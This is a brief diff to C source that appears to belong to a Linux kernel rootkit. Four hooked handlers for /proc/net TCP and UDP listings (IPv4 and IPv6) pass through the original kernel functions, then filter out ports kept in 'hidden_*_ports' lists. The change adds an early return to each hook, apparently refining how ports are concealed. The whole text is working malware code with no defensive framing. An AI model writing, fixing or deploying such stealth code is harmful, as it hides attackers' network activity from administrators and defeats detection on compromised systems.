@@ -171,6 +171,9 @@ static int n_tcp4_seq_show ( struct seq_file *seq, void *v )
     ret = tcp4_seq_show(seq, v);
     hijack_resume(tcp4_seq_show);
 
+    if (seq->count < TMPSZ)
+        return ret;
+
     list_for_each_entry ( hp, &hidden_tcp4_ports, list )
     {
         sprintf(port, ":%04X", hp->port);
@@ -193,6 +196,9 @@ static int n_tcp6_seq_show ( struct seq_file *seq, void *v )
     hijack_pause(tcp6_seq_show);
     ret = tcp6_seq_show(seq, v);
     hijack_resume(tcp6_seq_show);
+
+    if (seq->count < TMPSZ)
+        return ret;
 
     list_for_each_entry ( hp, &hidden_tcp6_ports, list )
     {
@@ -217,6 +223,9 @@ static int n_udp4_seq_show ( struct seq_file *seq, void *v )
     ret = udp4_seq_show(seq, v);
     hijack_resume(udp4_seq_show);
 
+    if (seq->count < TMPSZ)
+        return ret;
+
     list_for_each_entry ( hp, &hidden_udp4_ports, list )
     {
         sprintf(port, ":%04X", hp->port);
@@ -239,6 +248,9 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
     hijack_pause(udp6_seq_show);
     ret = udp6_seq_show(seq, v);
     hijack_resume(udp6_seq_show);
+
+    if (seq->count < TMPSZ)
+        return ret;
 
     list_for_each_entry ( hp, &hidden_udp6_ports, list )
     {
